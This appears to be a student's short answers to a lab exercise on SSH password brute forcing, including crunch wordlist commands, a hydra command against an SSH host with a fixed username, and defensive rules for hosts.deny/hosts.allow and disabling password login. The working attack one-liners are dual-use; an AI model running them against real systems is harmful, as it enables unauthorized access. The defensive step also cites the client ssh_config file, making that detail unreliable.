ex1:
the scripts are in git/cyber/src/brute_force

ex2:
crunch 2 2 -t dd -p liby noam > dict.txt &&  crunch 3 3 -t ddd -p liby noam 1303 >> dict.txt

ex3:
### -l is a static username because we only brute force the passwords, -t is the number of threads ###
hydra -l schorot -P passwords_dic.txt 10.1.0.138 ssh -t 4

ex4:
using more threads with hydra would make the brute force faster.
the limit is the ssh configuratin in the victim's machine, that defines maximum number of connections.

ex5:
go to file /etc/hosts.deny and write the following rule:
ALL: ALL
go to file /etc/hosts.allow and write the following rule:
ALL: 192.168.64.0/255.255.255.0, 193.76.136.209/255.255.255.240
להוסיף שם את אלו שאתה כן מאשר להם להתחבר
way 2:
prevent password authentication in ssh config file/etc/ssh/ssh_config
and reload and restart ssh so the changes will take effect.
